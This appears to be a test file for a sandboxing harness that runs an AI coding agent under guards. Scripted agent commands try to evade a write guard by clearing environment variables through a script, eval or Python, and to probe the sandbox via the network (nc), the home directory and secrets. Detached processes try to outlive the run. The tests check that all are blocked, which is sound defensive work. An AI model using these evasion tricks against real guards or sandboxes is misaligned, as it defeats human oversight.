  test.if(process.platform === "darwin" && !!PYTHON)("every call reaches the record whatever the agent's environment says, and a call never run is not a refusal", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    write(path.join(h.rec, "stream.jsonl"), [
      JSON.stringify({ type: "assistant", message: { content: [{ type: "tool_use", id: "t1", name: "Bash", input: { command: "false && cast send jx7nope never-ran" } }] } }),
      JSON.stringify({ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }),
    ].join("\n") + "\n");
    const bash = [
      `printf 'DRY_RUN_BROKER= DRY_RUN_LIVE_READ=1 DRY_RUN_FAKE_VIA_BROKER= cast task create via-script\\n' > s.sh; bash s.sh > /dev/null 2>&1`,
      `eval 'DRY_RUN_BROKER= DRY_RUN_LIVE_READ=1 cast trigger add via-eval' > /dev/null 2>&1`,
      `'${PYTHON}' -c "import os, subprocess; e = dict(os.environ, DRY_RUN_BROKER='', DRY_RUN_LIVE_READ='1'); subprocess.run(['cast', 'task', 'create', 'via-python'], env=e, capture_output=True)"`,
      "false && cast send jx7nope never-ran",
    ].join("; ");
    expect(h.runWith({ FAKE_CLAUDE_BASH: bash }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake").code).toBe(0);
    const log = fs.readFileSync(path.join(h.runDir, "calls.log"), "utf8");
    for (const write of ["task create via-script", "trigger add via-eval", "task create via-python"]) expect(log).toContain(`REFUSED ${write}`);
    expect(log).toContain("UNRECORDED send jx7nope never-ran");
    expect(log).not.toContain("REFUSED send jx7nope");
  }, 60_000);

  // End to end (round-3 review): a line replay's clone and a Try station's worktree through the closed world, with
  // line replay's own clone builder (replayCwd) and the arguments each launcher passes: git log, a test file that
  // imports a linked dependency, and a read-only database on --allow-port that refuses a write.
  // The first Postgres install whose server actually starts (a Homebrew keg can lose a library it links).
  const PG = ["/opt/homebrew/opt/postgresql@17/bin", "/opt/homebrew/opt/postgresql@16/bin", "/opt/homebrew/opt/postgresql@15/bin", "/opt/homebrew/bin", "/usr/local/bin"].find((d) => fs.existsSync(path.join(d, "initdb")) && fs.existsSync(path.join(d, "psql")) && Bun.spawnSync([path.join(d, "postgres"), "-V"]).exitCode === 0);
  test.if(process.platform === "darwin" && !!PG)("end to end: a line replay and a Try station run git, tests and a read-only database in the closed world", async () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    const pg = path.join(h.dir, "pg");
    const port = 20000 + Math.floor(Math.random() * 20000);
    const sh = (cmd: string[], env: Record<string, string> = {}) => { const r = Bun.spawnSync(cmd, { env: { ...process.env, ...env } }); if (r.exitCode !== 0) throw new Error(`${cmd.join(" ")}: ${r.stderr}`); return r.stdout.toString(); };
    sh([`${PG}/initdb`, "-D", pg, "-U", "owner", "-A", "trust"], { LC_ALL: "C" });
    // A socket path has a ~100 byte limit, so the socket dir is a short one.
    const sock = fs.mkdtempSync("/tmp/pg-");
    sh([`${PG}/pg_ctl`, "-D", pg, "-l", path.join(h.dir, "pg.log"), "-o", `-p ${port} -k ${sock} -h 127.0.0.1`, "-w", "start"], { LC_ALL: "C" });
    try {
      const psql = (sql: string) => sh([`${PG}/psql`, "-h", "127.0.0.1", "-p", String(port), "-U", "owner", "-d", "postgres", "-v", "ON_ERROR_STOP=1", "-tAc", sql]);
      psql("create table notes (note text); insert into notes values ('from-the-db'); create role reader login; grant select on notes to reader;");
      // A repository with a test file whose import resolves through its node_modules.
      const top = path.join(h.dir, "repo");
      const git = (cwd: string, ...args: string[]) => sh(["git", "-C", cwd, ...args], { GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" });
      fs.mkdirSync(top, { recursive: true });
      git(top, "init", "-q", "-b", "main");
      write(path.join(top, "package.json"), '{"name":"e2e","private":true}\n');
      write(path.join(top, "math.test.ts"), 'import { expect, test } from "bun:test";\nimport { add } from "adder";\ntest("adds", () => expect(add(2, 3)).toBe(5));\n');
      write(path.join(top, ".gitignore"), "node_modules\n.env.e2e\n");
      git(top, "add", "-A");
      git(top, "commit", "-q", "-m", "e2e-commit");
      write(path.join(top, "node_modules", "adder", "package.json"), '{"name":"adder","main":"index.js"}\n');
      write(path.join(top, "node_modules", "adder", "index.js"), "exports.add = (a, b) => a + b;\n");
      write(path.join(top, ".env.e2e"), `DATABASE_URL=postgres://reader@127.0.0.1:${port}/postgres\n`);
      const agent = [
        'echo "log: $(git log -1 --format=%s 2>&1)"',
        `echo "test: $('${process.execPath}' test math.test.ts 2>&1 | grep -Eo '[0-9]+ pass' | head -1)"`,
        `url=$(sed -n 's/^DATABASE_URL=//p' .env.e2e); echo "db: $('${PG}/psql' "$url" -tAc 'select note from notes' 2>&1)"`,
        `url=$(sed -n 's/^DATABASE_URL=//p' .env.e2e); echo "db-write: $('${PG}/psql' "$url" -tAc "insert into notes values ('x')" 2>&1 | head -1)"`,
      ].join("; ");
      // The replay: line replay's clone of the repository, its linked dependencies and its env file with the read-only URL.
      fs.mkdirSync(h.runDir, { recursive: true });
      const at = replayCwd(top, { context: { project_path: top }, completed: [] }, false, h.runDir, { file: ".env.e2e", key: "DATABASE_URL" });
      if ("reason" in at) throw new Error(at.reason);
      const replay = h.runWith({ FAKE_CLAUDE_BASH: agent, DRY_RUN_HIDE_REGEX: at.hide ?? "" }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake", "--cwd", at.cwd, "--read-only", ...(at.reads ?? []).flatMap((r) => ["--read", r]), "--allow-port", String(at.port));
      expect(replay.err).toBe("");
      const replaySaid = h.recorded("bash")!;
      console.log(`line replay (clone ${at.cwd}):\n${replaySaid}`);
      expect(replaySaid).toContain("log: e2e-commit");
      expect(replaySaid).toContain("test: 1 pass");
      expect(replaySaid).toContain("db: from-the-db");
      expect(replaySaid).toMatch(/db-write: .*permission denied/);
      // The Try station: a worktree of the repository (its .git points into the main checkout's), read-only.
      const wt = path.join(h.dir, "wt");
      git(top, "worktree", "add", "-q", wt);
      fs.symlinkSync(path.join(top, "node_modules"), path.join(wt, "node_modules"));
      fs.copyFileSync(path.join(top, ".env.e2e"), path.join(wt, ".env.e2e"));
      const h2 = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
      const tryAgent = agent.replace(/\.env\.e2e/g, "/dev/null");
      const station = h2.runWith({ FAKE_CLAUDE_BASH: tryAgent }, "--run", h2.runDir, "--prompt", h2.prompt, "--model", "m", "--account", "fake", "--cwd", wt, "--read-only", "--read", path.join(top, "node_modules"));
      expect(station.err).toBe("");
      const stationSaid = h2.recorded("bash")!;
      console.log(`Try station (worktree ${wt}):\n${stationSaid}`);
      expect(stationSaid).toContain("log: e2e-commit");
      expect(stationSaid).toContain("test: 1 pass");
      // A station's checkout keeps its env files to itself: the database is reachable only for a replay that was given its URL.
      expect(fs.readFileSync(path.join(wt, ".env.e2e"), "utf8")).toContain("reader@");
    } finally {
      Bun.spawnSync([`${PG}/pg_ctl`, "-D", pg, "-m", "immediate", "stop"]);
    }
  }, 120_000);

  test.if(process.platform === "darwin")("a guard that cannot answer stops the run before any agent starts", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false }]);
    const broken = path.join(h.dir, "broken-guard");
    write(path.join(broken, "cast"), "#!/usr/bin/env bash\necho 'cannot create temp file for here document' >&2\nexit 1\n", 0o755);
    const r = h.run("--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake", "--guard", broken);
    expect(r.code).toBe(2);
    expect(r.err).toContain("the dry run's guard is not usable, so no agent starts");
    expect(r.err).toContain("cannot create temp file for here document");
    expect(h.recorded("argv")).toBeNull();
  }, 60_000);

  test("a run dir that belongs to a live run is refused, and nothing in it is touched", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false }]);
    write(path.join(h.runDir, "harness.pid"), `${process.pid}\n`);
    write(path.join(h.runDir, ".claude", "dry-run-env.sh"), "live");
    const r = h.run("--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake");
    expect(r.code).toBe(2);
    expect(r.err).toContain(`belongs to a run still alive (harness pid ${process.pid})`);
    expect(fs.readFileSync(path.join(h.runDir, ".claude", "dry-run-env.sh"), "utf8")).toBe("live");
    expect(h.recorded("argv")).toBeNull();
  }, 30_000);

  test.if(process.platform === "darwin")("the agent dies with its harness, even when the harness is killed outright", async () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false }]);
    const p = Bun.spawn(["bun", HARNESS, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake"], {
      env: { PATH: `${h.bin}:${path.dirname(process.execPath)}:/usr/bin:/bin`, HOME: h.dir, CODECAST_DIR: h.state, FAKE_CLAUDE_REC: h.rec, FAKE_CLAUDE_STREAM: path.join(h.rec, "stream.jsonl"), DRY_RUN_PASS_ENV: "FAKE_CLAUDE_REC,FAKE_CLAUDE_STREAM,FAKE_CLAUDE_BASH", FAKE_CLAUDE_BASH: `echo $$ > "$FAKE_CLAUDE_REC/agent-pid"; sleep 120` },
      stdout: "ignore", stderr: "ignore",
    });
    const until = async (ok: () => boolean, ms: number) => { const end = Date.now() + ms; while (!ok() && Date.now() < end) await Bun.sleep(200); return ok(); };
    expect(await until(() => !!h.recorded("agent-pid")?.trim(), 30_000)).toBe(true);
    const agent = Number(h.recorded("agent-pid")!.trim());
    const alive = () => { try { process.kill(agent, 0); return true; } catch { return false; } };
    expect(alive()).toBe(true);
    p.kill("SIGKILL");
    expect(await until(() => !alive(), 20_000)).toBe(true);
  }, 60_000);

  // ct-56832: two agents in flight both wrote /tmp/org_inputs.json and one graded the other's world.
  test.if(process.platform === "darwin")("two agent runs in flight cannot see each other's /tmp scratch, and each keeps its own under $TMPDIR", async () => {
    const shared = `/tmp/dry-run-isolation-${process.pid}.json`;
    fs.writeFileSync(shared, "planted outside");
    try {
      const agent = (id: string) => [
        `echo ${id} > ${shared} && echo tmp-write-ok || echo tmp-write-refused`,
        `cat ${shared} 2>&1 | sed 's/^/tmp-read: /'`,
        `echo ${id} > "$TMPDIR/x.json"`,
        "sleep 1",
        `echo "mine: $(cat "$TMPDIR/x.json")"`,
        `echo "claude-tmp: $CLAUDE_CODE_TMPDIR"`,
      ].join("; ");
      const result = [{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0 }];
      const [a, b] = [harnessWorld(result), harnessWorld(result)];
      const runs = await Promise.all([a, b].map((h, i) => h.runAsync({ FAKE_CLAUDE_BASH: agent(`agent-${i}`) }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake")));
      expect(runs.map((r) => r.code)).toEqual([0, 0]);
      for (const [i, h] of [a, b].entries()) {
        const said = h.recorded("bash")!;
        expect(said).toContain("tmp-write-refused");
        expect(said).toContain("Operation not permitted");
        expect(said).not.toContain("planted outside");
        expect(said).toContain(`mine: agent-${i}`);
        expect(said).not.toContain(`agent-${1 - i}`);
        expect(said).toContain(`claude-tmp: ${path.join(h.runDir, "tmp")}`);
        expect(JSON.parse(fs.readFileSync(path.join(h.runDir, "args.json"), "utf8")).isolation).toBe("sandbox-exec");
      }
      expect(fs.readFileSync(shared, "utf8")).toBe("planted outside");
    } finally {
      fs.rmSync(shared, { force: true });
    }
  }, 60_000);

  test("--isolation-check answers whether agent scratch is private here, and runs nothing else", () => {
    const r = Bun.spawnSync(["bun", HARNESS, "--isolation-check"], { env: { PATH: `${path.dirname(process.execPath)}:/usr/bin:/bin`, HOME: os.homedir() } });
    if (process.platform === "darwin") expect({ code: r.exitCode, out: r.stdout.toString() }).toEqual({ code: 0, out: "isolated\n" });
    else expect(r.exitCode).toBe(3);
  }, 30_000);

  // evals grow scores and tests a model's edit this way: code nobody vouches for, written from prod text.
  test.skipIf(process.platform !== "darwin")("--exec runs one command in the closed world: no network, no home, no env, writes only in its run dir, its exit code passed back", () => {
    const run = path.join(tmpRoot, "exec-run");
    const outside = fs.mkdtempSync(path.join(tmpRoot, "exec-outside-"));
    const home = fs.realpathSync(os.homedir());
    const probe = [
      `: > "${run}/inside" && echo run-write`,
      `( : > "${outside}/x" ) 2>/dev/null && echo outside-write`,
      `ls "${home}" >/dev/null 2>&1 && echo home-read`,
      `/usr/bin/nc -z -G 3 1.1.1.1 443 >/dev/null 2>&1 && echo network`,
      `[ -n "$EXEC_SECRET" ] && echo env`,
      "exit 7",
    ].join("; ");
    const r = Bun.spawnSync(["bun", HARNESS, "--exec", "--run", run, "--", "/bin/sh", "-c", probe], { env: { PATH: `${path.dirname(process.execPath)}:/usr/bin:/bin`, HOME: os.homedir(), EXEC_SECRET: "s3cret" } });
    expect({ code: r.exitCode, out: fs.readFileSync(path.join(run, "exec.out"), "utf8"), exit: fs.readFileSync(path.join(run, "exit.txt"), "utf8") }).toEqual({ code: 7, out: "run-write\n", exit: "7\n" });
    expect(fs.readdirSync(outside)).toEqual([]);
  }, 60_000);

  // A child that detaches (nohup, its own session, a pipe held open) is killed when --exec ends, and --timeout ends it however it hangs.
  test.skipIf(process.platform !== "darwin")("--exec leaves nothing running: a detached child dies with it, and --timeout ends a hung command", () => {
    const alive = (pid: number) => { try { process.kill(pid, 0); return true; } catch { return false; } };
    const env = { PATH: `${path.dirname(process.execPath)}:/usr/bin:/bin`, HOME: os.homedir() };
    const left = path.join(tmpRoot, "exec-left");
    const r = Bun.spawnSync(["bun", HARNESS, "--exec", "--run", left, "--", "/bin/sh", "-c", 'nohup /bin/sleep 300 & echo $! > child.pid; /usr/bin/perl -e "use POSIX; POSIX::setsid(); exec q{/bin/sleep}, 301" & echo $! > setsid.pid; exit 0'], { env, timeout: 30_000 });
    expect(r.exitCode).toBe(0);
    for (const f of ["child.pid", "setsid.pid"]) expect(alive(Number(fs.readFileSync(path.join(left, f), "utf8")))).toBe(false);
    const hung = path.join(tmpRoot, "exec-hung");
    const started = Date.now();
    const h = Bun.spawnSync(["bun", HARNESS, "--exec", "--run", hung, "--timeout", "2", "--", "/bin/sh", "-c", "echo $$ > sh.pid; /bin/sleep 300 | /bin/cat"], { env, timeout: 30_000 });
    expect({ code: h.exitCode, exit: fs.readFileSync(path.join(hung, "exit.txt"), "utf8") }).toEqual({ code: 124, exit: "124\n" });
    expect(Date.now() - started).toBeLessThan(20_000);
    expect(alive(Number(fs.readFileSync(path.join(hung, "sh.pid"), "utf8")))).toBe(false);
  }, 60_000);

  test("each --then is one more turn resumed into the same session, in order, with a turn line in calls.log", () => {
    const h = harnessWorld([
      { type: "assistant", message: { content: [{ type: "text", text: "Said." }] } },
      { type: "result", result: "Said.", is_error: false, num_turns: 1, total_cost_usd: 0.01, session_id: "s-1" },
    ]);
    write(path.join(h.dir, "then2.md"), "Second message.");
    write(path.join(h.dir, "then3.md"), "Third message.");
    expect(h.run("--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake", "--then", path.join(h.dir, "then2.md"), "--then", path.join(h.dir, "then3.md")).code).toBe(0);
    for (const n of ["2", "3"]) {
      expect(JSON.parse(fs.readFileSync(path.join(h.runDir, `said${n}.json`), "utf8"))).toEqual(["Said."]);
      expect(fs.existsSync(path.join(h.runDir, `out${n}.json`))).toBe(true);
    }
    const argv = h.recorded("argv")!.split("\n");
    expect(argv[argv.indexOf("--resume") + 1]).toBe("s-1");
    expect(argv[argv.indexOf("-p") + 1]).toBe("Third message.");
    expect(fs.readFileSync(path.join(h.runDir, "calls.log"), "utf8")).toBe("# turn 2\n# turn 3\n");
  }, 30_000);
});
